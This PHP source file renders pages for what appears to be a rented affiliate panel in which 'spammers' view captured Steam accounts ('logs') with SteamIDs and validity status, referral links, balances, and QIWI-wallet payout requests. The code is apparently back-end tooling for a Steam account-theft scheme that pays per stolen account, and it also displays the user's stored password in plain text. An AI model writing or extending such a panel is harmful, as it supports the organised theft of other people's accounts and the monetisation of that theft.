<?php
require_once("classPanel.php");

	class PageGenerator {
		private $PathToTemplate;
		private $part;
		private $id;
		
		function __construct($PathToTemplate, $part = false, $id = ""){
			$this->PathToTemplate = $PathToTemplate;
			$this->part = $part;
			$this->id = $id;
		}
		
		private function _generatePage($content) {
			$layout = file_get_contents($this->PathToTemplate . "/layout.html");
			$Panel = new classPanel();
			
			$page = str_replace
			(
				array(
					"%content%",
					"%csrf_token%"
				),
				array(
					$content,
					$_SESSION["csrf_token"]
				),
				$layout
			);
			
			if ($Panel->int_GetTimerActivity() > 0) {
				$time_left = $Panel->int_GetTimerTime() - time();
				$days_left = date("j", $time_left);
				
				$page = str_replace("%timer%", "Дней осталось: " . $days_left, $page);
			}
			else $page = str_replace("%timer%", "", $page);
			
			if ($this->part) {
				$html = str_get_html($page);
				$page = $html->find("#" . $this->id, 0)->innertext;
			}
			
			return $page;
		}
		
		public function GenerateAuth(){
			$Page = file_get_contents($this->PathToTemplate . "/pages/auth.html");
			
			return $Page;
		}
		
		public function GenerateReg(){
			$Page = file_get_contents($this->PathToTemplate . "/pages/reg.html");
			
			return $Page;
		}
		
		public function GenerateIndex(){
			$content = file_get_contents($this->PathToTemplate . "/pages/main.html");
			
			$Panel = new classPanel();
			
			$spammer = $Panel->arr_GetSpammerByLogin($_SESSION["spammer_login"]);
			
			if (true) { //$Panel->b_AccountsExist($_SESSION["spammer_login"])
				/*
				 *     TABLE
				 */
				
				$table_tpl = 
				'
							<table cellpadding="0" cellspacing="0">
                                <thead>
                                    <tr role="row">
										<th style="padding-left: 15px; width: 190px;">Профиль</th>
										<th style="text-align: center">Статус</th>
										<th style="text-align: center">Дата</th>
									</tr>
                                </thead>
                                <tbody>
									%table_content%
								</tbody>
                            </table>
				';
				
				$row_tpl = 
				'
								<tr id="row-%id%" role="row" class="odd %valid-class%" >
									<td style="padding-left: 15px; width: 190px;"><a href="http://steamcommunity.com/profiles/%steamid%" target="_blank">%steamid%</a></td>
									<td style="text-align: center">%status%</td>
									<td style="text-align: center">%time%</td>
								</tr>
				';
				
				$rows = "";
				$accounts = $Panel->arr_GetAccounts($_SESSION["spammer_login"]);
				
				for ($i = 0; $i < count($accounts); $i++) {
					if ($accounts[$i]["status"] == 0) {
						$valid_class = "";
						$status = "<i class='mdi mdi-close'></i>";
					} 
					else {
						$valid_class = "valid";
						$status = "<i class='mdi mdi-check'></i>";
					} 
					
					$rows .= str_replace
					(
						array("%steamid%", "%time%", "%id%", "%status%", "%valid-class%"),
						array(
							$accounts[$i]["steamid"], 
							date("d.n.y, H:i:s", $accounts[$i]["time"]),
							$accounts[$i]["id"],
							$status,
							$valid_class
						),
						$row_tpl
					);
				}
				
				$table = str_replace("%table_content%", $rows, $table_tpl);
				/*
				 *     /TABLE
				 */
				
				$content = str_replace
				(
					array("%table%", "%balance%", "%spammer_login%", "%ref_link%", "%id%", "%total_logs%"),
					array(
						$table,
						$spammer["balance"],
						$spammer["login"],
						$_SERVER["SERVER_NAME"] . "/?ref=" . $_SESSION["spammer_login"],
						$spammer["id"],
						$Panel->int_CountAccounts($_SESSION["spammer_login"])
					),
					$content
				);
			}
			// else {
				// $content = str_replace
				// (
					// array(
						// "%table%", 
						// "%balance%",
						// "%spammer_login%",
						// "%ref_link%",
						// "%id%",
						// "%total_logs%"
					// ),
					// array(
						// '<p class="text-center">Нет аккаунтов в базе</p>',
						// $spammer["balance"],
						// $spammer["login"],
						// $_SERVER["SERVER_NAME"] . "/?ref=" . $_SESSION["spammer_login"],
						// $spammer["id"],
						// 0
					// ),
					// $content
				// );
			// }
			
			$Page = self::_generatePage($content);
			return $Page;
		}
		
		public function GenerateSettings(){
			$content = file_get_contents($this->PathToTemplate . "/pages/settings.html");
			
			$Panel = new classPanel();
			$spammer = $Panel->arr_GetSpammerByLogin($_SESSION["spammer_login"]);
			
			$settings_content = "";
			$settings = [
				[
					"name" => "login", 
					"normalName" => "Логин",
					"value" => $spammer["login"]
				], 
				[
					"name" => "password", 
					"normalName" => "Пароль",
					"value" => $spammer["password"]
				], 
				[
					"name" => "qiwi", 
					"normalName" => "QIWI Кошелек",
					"value" => $spammer["qiwi"]
				]
			];
			
			foreach ($settings as $key => $setting) {
				$settings_content .= '
				<div class="form-group">
					<label for="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'">'. (htmlspecialchars($setting["normalName"], ENT_QUOTES)) .'</label>
					<input type="text" name="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" id="'. (htmlspecialchars($setting["name"], ENT_QUOTES)) .'" class="text-field-narrow" placeholder="'. (htmlspecialchars($setting["normalName"], ENT_QUOTES)) .'" value="'. (htmlspecialchars($setting["value"], ENT_QUOTES)) .'">
				</div>
				';
			}
			
			
				$table_tpl = 
				'
							<table cellpadding="0" cellspacing="0">
                                <thead>
                                    <tr role="row">
										<th style="padding-left: 15px; width: 190px;">Сумма</th>
										<th style="text-align: center">Статус</th>
									</tr>
                                </thead>
                                <tbody>
									%table_content%
								</tbody>
                            </table>
				';
				
				$row_tpl = 
				'
								<tr id="row-%id%" role="row" class="odd" >
									<td style="padding-left: 15px; width: 190px;">%sum%</td>
									<td style="text-align: center">%status%</td>
								</tr>
				';
				
				$rows = "";
				$payouts = $Panel->arr_GetPayoutsByLogin($_SESSION["spammer_login"]);
				
				
				for ($i = 0; $i < count($payouts); $i++) {
					if ($payouts[$i]["state"] == 0) $status = "В ожидании";
					else if ($payouts[$i]["state"] == 1) $status = "Выплачено";
					else if ($payouts[$i]["state"] == 2) $status = "Отказано";
					
					$rows .= str_replace
					(
						array("%id%", "%sum%", "%status%"),
						array(
							$payouts[$i]["id"],
							$payouts[$i]["sum"],
							$status
						),
						$row_tpl
					);
				}
				
				$table = str_replace("%table_content%", $rows, $table_tpl);
			
			
			$content = str_replace
			(
				array("%settings_content%", "%table%"),
				array($settings_content, $table),
				$content
			);
			
			if ($spammer["balance"] > 0) 
				$content = str_replace
				(
					"%order%",
					"<center><a href=\"javascript:performAction('Order', {}); updatePart('payouts')\">Заказать выплату</a></center>",
					$content
				);
			else 
				$content = str_replace
				(
					"%order%",
					"",
					$content
				);
			
			$Page = self::_generatePage($content);
			return $Page;
		}
		
		public function GenerateRentIsOver(){
			$Page = file_get_contents($this->PathToTemplate . "/rent_is_over.html");
			
			return $Page;
		}
	}
?>